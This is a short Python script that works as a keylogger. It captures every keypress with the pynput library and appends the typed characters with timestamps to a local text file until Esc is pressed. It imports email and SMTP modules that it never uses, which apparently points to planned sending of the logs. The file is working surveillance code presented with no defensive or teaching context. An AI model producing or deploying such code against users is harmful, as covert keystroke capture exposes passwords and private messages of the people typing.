import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

log_file = "key_presses.txt"
keys_pressed = "" 

def on_press(key):
    global keys_pressed
    try:
        print(f"Key {key.char} pressed")
        keys_pressed += key.char
    except AttributeError:
        print(f"Special key {key} pressed")

def on_release(key):
    global keys_pressed
    
    print(f"Key {key} released")

    with open(log_file, "a") as f:
        f.write(f"Keys pressed: {keys_pressed} at {datetime.datetime.now()}")

    keys_pressed = ""
    
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()